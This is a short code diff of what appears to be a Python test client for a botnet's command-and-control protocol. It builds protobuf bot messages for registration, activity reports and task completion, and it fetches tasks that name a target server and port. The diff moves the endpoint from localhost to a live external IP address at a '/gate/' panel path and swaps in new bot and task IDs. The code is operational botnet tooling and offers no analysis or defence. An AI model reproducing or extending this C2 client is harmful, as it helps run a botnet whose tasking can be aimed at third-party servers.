@@ -12,7 +12,7 @@ bot.os_minor = 2
 bot.is_x64 = True
 bot.is_server = False
 #r = requests.post(url='http://185.250.151.137:80/gate/', data='1'.encode('utf-8'))
-#r = requests.post(url='http://127.0.0.1:8000/gate/', data=struct.pack('=I', 1) + bot.SerializeToString())
+#r = requests.post(url='http://185.250.151.137:80/gate/', data=struct.pack('=I', 1) + bot.SerializeToString())
 
 #print(r.text, 'text')
 #_r = bot_pb2.PanelMsg.RegistrationResult()
@@ -21,17 +21,17 @@ bot.is_server = False
 
 
 ar = bot_pb2.BotMsg.ActivityReport()
-ar.uid = '1234'.encode('utf-16-le')
+ar.uid = '5555'.encode('utf-16-le')
 
-r1 = requests.post(url='http://127.0.0.1:8000/gate/', data=struct.pack('=I', 2) + ar.SerializeToString())
+r1 = requests.post(url='http://185.250.151.137:80/gate/', data=struct.pack('=I', 2) + ar.SerializeToString())
 b = bot_pb2.PanelMsg.TaskGiveaway()
 b.ParseFromString(r1.content)
 print(b.is_empty, b.task.task_id.decode('utf-16-le'), b.task.server, b.task.port, 'activ rep')
 
 task = bot_pb2.BotMsg.TaskCompleted()
-task.task_id = '34'.encode('utf-16-le')
+task.task_id = '41'.encode('utf-16-le')
 task.result = True
-task.uid = '1234'.encode('utf-16-le')
+task.uid = '5555'.encode('utf-16-le')
 
-r2 = requests.post(url='http://127.0.0.1:8000/gate/', data=struct.pack('=I', 3) + task.SerializeToString())
+r2 = requests.post(url='http://185.250.151.137:80/gate/', data=struct.pack('=I', 3) + task.SerializeToString())
 print(r2.text)
